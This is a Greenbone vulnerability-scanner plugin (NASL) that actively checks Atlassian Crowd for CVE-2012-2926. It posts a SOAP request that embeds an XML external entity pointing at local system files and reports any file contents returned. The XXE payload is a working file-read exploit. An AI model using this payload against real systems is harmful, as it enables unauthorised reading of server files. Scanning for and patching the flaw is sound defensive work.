# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:atlassian:crowd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103512");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-08-06 16:05:00 +0000 (Thu, 06 Aug 2020)");

  script_cve_id("CVE-2012-2926");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Atlassian Crowd XML Parser Vulnerability (JRA-27719) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_atlassian_crowd_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("atlassian/crowd/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Atlassian Crowd does not properly restrict the capabilities of
  third-party XML parsers, which allows remote attackers to read arbitrary files or cause a denial
  of service (resource consumption) via unspecified vectors.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"Attlassian Crowd prior to version 2.0.9, version 2.1.x
  through 2.1.1, 2.2.x through 2.2.8, 2.3.x through 2.3.6 and 2.4.0.");

  script_tag(name:"solution", value:"Update to version 2.0.9, 2.1.2, 2.2.9, 2.3.7, 2.4.1 or
  later.");

  script_xref(name:"URL", value:"https://jira.atlassian.com/browse/JRA-27719");
  script_xref(name:"URL", value:"http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2012-05-17");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53595");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/crowd/services";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
if (!res || "Invalid SOAP request" >!< res)
  exit(0);

files = traversal_files();
entity = rand_str(length: 8, charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

foreach pattern (keys(files)) {

  file = files[pattern];

  soap = '<!DOCTYPE foo [<!ENTITY ' + entity + ' SYSTEM "file:///' + file + '"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
<soapenv:Header/>
<soapenv:Body>
<urn:addAllPrincipals>
<urn:in0>
<!--Optional:-->
<aut:name>?</aut:name>
<!--Optional:-->
<aut:token>?</aut:token>
</urn:in0>
<urn:in1>
<!--Zero or more repetitions:-->
<soap:SOAPPrincipalWithCredential>
<!--Optional:-->
<soap:passwordCredential>
<!--Optional:-->
<aut:credential>?</aut:credential>
<!--Optional:-->
<aut:encryptedCredential>?&' + entity  + ';</aut:encryptedCredential>
</soap:passwordCredential>
<!--Optional:-->
<soap:principal>
<!--Optional:-->
<soap:ID>?</soap:ID>
<!--Optional:-->
<soap:active>?</soap:active>
<!--Optional:-->
<soap:attributes>
<!--Zero or more repetitions:-->
<soap:SOAPAttribute>
<!--Optional:-->
<soap:name>?</soap:name>
<!--Optional:-->
<soap:values>
<!--Zero or more repetitions:-->
<urn:string>?</urn:string>
</soap:values>
</soap:SOAPAttribute>
</soap:attributes>';

  headers = make_array("SOAPAction", '""',
                       "Content-Type", "text/xml; charset=UTF-8");

  req = http_post_put_req(port: port, url: url, data: soap, add_headers: headers);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to read the file "' + file + '".\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
